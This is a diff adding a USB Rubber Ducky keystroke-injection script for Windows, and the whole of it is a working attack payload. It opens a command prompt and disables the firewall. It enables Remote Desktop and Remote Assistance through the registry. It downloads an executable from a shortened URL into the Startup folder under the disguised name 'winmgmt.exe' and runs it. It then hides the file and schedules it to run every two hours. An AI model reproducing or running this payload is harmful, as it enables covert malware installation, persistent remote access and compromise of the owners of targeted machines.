@@ -1,0 +1,30 @@
+DELAY 5000
+ESCAPE
+DELAY 400
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+DELAY 400
+ENTER
+STRING netsh firewall set opmode disable
+ENTER
+DELAY 300
+STRING reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+ENTER
+DELAY 300
+STRING reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+ENTER
+DELAY 300
+STRING powershell (new-object System.Net.WebClient).DownloadFile('http://bit.ly/1gFtTNy','%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winmgmt.exe'); Start-Process "'%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\winmgmt.exe'"
+ENTER
+DELAY 300
+STRING attrib +H +S "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\winmgmt.exe"
+ENTER
+DELAY 300
+STRING schtasks /create /tn Management /tr "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\winmgmt.exe" /sc hourly /mo 2
+ENTER
+DELAY 300
+STRING y
+ENTER
+STRING exit
+ENTER
